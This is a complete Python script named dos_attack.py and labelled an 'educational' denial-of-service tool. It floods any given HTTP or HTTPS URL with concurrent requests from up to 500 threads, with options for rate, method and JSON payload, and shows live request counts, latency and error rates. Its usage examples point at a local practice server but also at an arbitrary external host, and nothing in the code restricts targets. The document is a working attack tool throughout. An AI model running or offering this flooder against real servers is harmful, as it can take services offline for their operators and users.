#!/usr/bin/env python3
"""
dos_attack.py — Educational DoS Attack Script
=============================================
Floods a target HTTP server with concurrent requests.
The target server has NO rate limiting, NO validation, NO auth — by design.

Requirements: Python 3.8+  (stdlib only — no pip installs needed)

Usage:
  python3 dos_attack.py --target http://localhost:3001/api/flood
  python3 dos_attack.py --target http://localhost:3001/api/flood --rate 200 --workers 100
  python3 dos_attack.py --target http://localhost:3001/api/compute --rate 30
  python3 dos_attack.py --target http://example.com/some/endpoint --method POST
  python3 dos_attack.py --help
"""

import argparse
import http.client
import json
import sys
import threading
import time
import urllib.parse
from collections import deque

# ─── ANSI colours ──────────────────────────────────────────────────────────────

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

# ─── Thread-safe statistics ───────────────────────────────────────────────────

class Stats:
    def __init__(self):
        self._lock     = threading.Lock()
        self.total     = 0
        self.success   = 0
        self.errors    = 0
        self.active    = 0
        self.latencies = deque(maxlen=500)

    def inc_active(self):
        with self._lock:
            self.active += 1

    def record(self, latency_ms: float, ok: bool):
        with self._lock:
            self.total  += 1
            self.active  = max(0, self.active - 1)
            if ok:
                self.success += 1
                self.latencies.append(latency_ms)
            else:
                self.errors += 1

    @property
    def avg_latency(self) -> float:
        with self._lock:
            lats = list(self.latencies)
        return sum(lats) / len(lats) if lats else 0.0

    @property
    def p99_latency(self) -> float:
        with self._lock:
            lats = sorted(self.latencies)
        return lats[int(len(lats) * 0.99)] if lats else 0.0

    @property
    def error_pct(self) -> float:
        with self._lock:
            t, e = self.total, self.errors
        return (e / t * 100) if t else 0.0

# ─── Fire a single request ───────────────────────────────────────────────────

def fire_request(host, port, path, method, body, stats, use_https):
    stats.inc_active()
    t_start = time.perf_counter()
    try:
        if use_https:
            conn = http.client.HTTPSConnection(host, port, timeout=10)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=10)
        headers = {"User-Agent": "DoS-Educational/1.0"}
        if body:
            headers["Content-Type"] = "application/json"
        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        resp.read()
        conn.close()
        latency = (time.perf_counter() - t_start) * 1000
        stats.record(latency, ok=resp.status < 500)
    except Exception:
        latency = (time.perf_counter() - t_start) * 1000
        stats.record(latency, ok=False)

# ─── Worker thread ────────────────────────────────────────────────────────────

def worker(host, port, path, method, body, stats, stop_evt, delay, use_https):
    while not stop_evt.is_set():
        fire_request(host, port, path, method, body, stats, use_https)
        if delay > 0:
            time.sleep(delay)

# ─── Console display ──────────────────────────────────────────────────────────

def display_loop(stats, stop_evt, target, rate, workers):
    t_start    = time.time()
    prev_total = 0

    print(f"\n{BOLD}{RED}  ╔══════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}{RED}  ║       DoS Attack Active  ·  Educational Demo          ║{RESET}")
    print(f"{BOLD}{RED}  ╠══════════════════════════════════════════════════════╣{RESET}")
    print(f"{BOLD}{RED}  ║  Target  : {CYAN}{target}{RESET}")
    print(f"{BOLD}{RED}  ║  Rate    : {YELLOW}{rate} req/s  ·  {workers} worker threads{RESET}")
    print(f"{BOLD}{RED}  ║  Press   : {DIM}Ctrl+C to stop{RESET}")
    print(f"{BOLD}{RED}  ╚══════════════════════════════════════════════════════╝{RESET}\n")

    while not stop_evt.is_set():
        time.sleep(1.0)

        elapsed    = time.time() - t_start
        total_now  = stats.total
        delta      = total_now - prev_total
        prev_total = total_now

        avg     = stats.avg_latency
        p99     = stats.p99_latency
        err_pct = stats.error_pct
        active  = stats.active

        err_col = GREEN if err_pct < 5 else (YELLOW if err_pct < 25 else RED)

        sys.stdout.write(
            f"\r{BOLD}[{elapsed:6.1f}s]{RESET}  "
            f"Sent: {CYAN}{total_now:>8,}{RESET}  "
            f"Rate: {YELLOW}{delta:>5}/s{RESET}  "
            f"Active: {CYAN}{active:>4}{RESET}  "
            f"Avg: {avg:>7.1f}ms  "
            f"p99: {p99:>7.1f}ms  "
            f"Errors: {err_col}{stats.errors:>5} ({err_pct:.1f}%){RESET}   "
        )
        sys.stdout.flush()

# ─── Main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        prog="dos_attack.py",
        description="Educational DoS attack — floods a target HTTP server with concurrent requests",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 dos_attack.py --target http://localhost:3001/api/flood
  python3 dos_attack.py --target http://localhost:3001/api/flood --rate 200 --workers 100
  python3 dos_attack.py --target http://localhost:3001/api/compute --rate 30
  python3 dos_attack.py --target http://example.com/endpoint --method POST
        """,
    )
    parser.add_argument(
        "--target", required=True,
        help="Full URL to attack (e.g. http://localhost:3001/api/flood)",
    )
    parser.add_argument(
        "--method", default="GET",
        help="HTTP method: GET, POST, PUT, DELETE (default: GET)",
    )
    parser.add_argument(
        "--rate", type=int, default=50,
        help="Target requests per second (default: 50)",
    )
    parser.add_argument(
        "--workers", type=int, default=None,
        help="Number of worker threads (default: min(rate, 500))",
    )
    parser.add_argument(
        "--payload", default='{"dos":true,"src":"python"}',
        help='JSON body for POST/PUT requests (default: {"dos":true})',
    )
    args = parser.parse_args()

    parsed    = urllib.parse.urlparse(args.target)
    host      = parsed.hostname or "localhost"
    port      = parsed.port or (443 if parsed.scheme == "https" else 80)
    path      = parsed.path or "/"
    use_https = parsed.scheme == "https"

    n_workers = args.workers or min(args.rate, 500)
    method    = args.method.upper()
    body      = args.payload.encode() if method in ("POST", "PUT", "PATCH") else None
    delay     = max(0.0, (n_workers / args.rate) - 0.015)

    stats    = Stats()
    stop_evt = threading.Event()

    # Spawn workers
    threads = []
    for _ in range(n_workers):
        t = threading.Thread(
            target=worker,
            args=(host, port, path, method, body, stats, stop_evt, delay, use_https),
            daemon=True,
        )
        t.start()
        threads.append(t)

    # Display thread
    disp = threading.Thread(target=display_loop, args=(stats, stop_evt, args.target, args.rate, n_workers), daemon=True)
    disp.start()

    # Wait for Ctrl+C
    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}[!] Stopping attack…{RESET}")
        stop_evt.set()
        disp.join(timeout=2)
        print(f"\n{GREEN}[+] Attack stopped.{RESET}")
        print(f"    Total fired   : {stats.total:,}")
        print(f"    Successful    : {stats.success:,}")
        print(f"    Errors        : {stats.errors:,}  ({stats.error_pct:.1f}%)")
        print(f"    Avg latency   : {stats.avg_latency:.1f} ms")
        print(f"    p99 latency   : {stats.p99_latency:.1f} ms\n")


if __name__ == "__main__":
    main()
